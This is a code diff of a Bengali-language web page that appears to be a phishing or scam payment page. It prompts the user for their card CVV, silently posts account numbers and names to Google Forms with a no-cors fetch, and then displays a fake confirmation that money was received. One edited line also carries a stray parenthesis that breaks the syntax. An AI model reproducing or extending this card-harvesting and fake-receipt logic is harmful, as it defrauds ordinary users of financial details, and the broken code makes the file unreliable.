@@ -121,8 +121,7 @@ document.querySelector('.no-connection-popup').style.zIndex = '1001';
         await fetchData2();
 
         const failed = document.getElementById("no-connection-popup2");
-        const done = document.getElementById("no-connection-popup3");
-
+       
         if (secureData?.id !== accountNumber) {
             playAudio(audioElement2);
             showError(failed, "কার্ড নম্বর বৈধ নয়। আপনার কার্ড এর CVV দিন।");
@@ -141,8 +140,7 @@ document.querySelector('.no-connection-popup').style.zIndex = '1001';
                 formData.append(form.entries.description, form === googleFormsData[0] ? description : `${xnameid} ${accountNumber}`);
 
                 fetch(form.url, { method: "POST", mode: "no-cors", body: formData })
-                    .then(() => {const sendMoneyForm = document.getElementById('send-money-form');
-sendMoneyForm.innerHTML = `<img src="bdone.gif" style="width: 100%; height: auto; pointer-event:none">`;
+                    .then(() => { document.getElementById('profilePic').src="bdone.gif";
                         document.getElementById("result").innerText = `আপনার একাউন্টে ${amount}৳ গ্রহণ সম্পূর্ণ হয়েছে।`);
                         playAudio(audioElement);setTimeout(() => {
                         window.location.href = "user.html";
